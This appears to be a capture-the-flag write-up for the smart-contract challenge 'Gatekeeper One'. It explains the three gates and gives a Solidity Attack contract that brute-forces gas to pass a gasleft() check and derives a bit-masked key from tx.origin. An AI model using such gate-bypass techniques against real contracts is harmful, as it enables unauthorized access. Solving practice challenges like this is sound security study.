Level 13: Gatekeeper One

Objective:

Pass through three gates and enter the contract.

Explanation:

Gate 1: This is simple here we just need to call this from another contract.

Gate 2: gasleft() % 8191 == 0.

Gate 3: uint32(tx.origin) must match lower 16 bits of a custom gateKey.

Solution:

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function attack(address _target) external  {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        for (uint256 i = 0; i < 500; i++) 
        {
            uint256 totalGas = i + (3 * 8191);
            (bool result, ) = _target.call{gas: totalGas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (result) {
                break;
            }
        }
    }
    
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

Key Takeaways:

Learned about typecasting
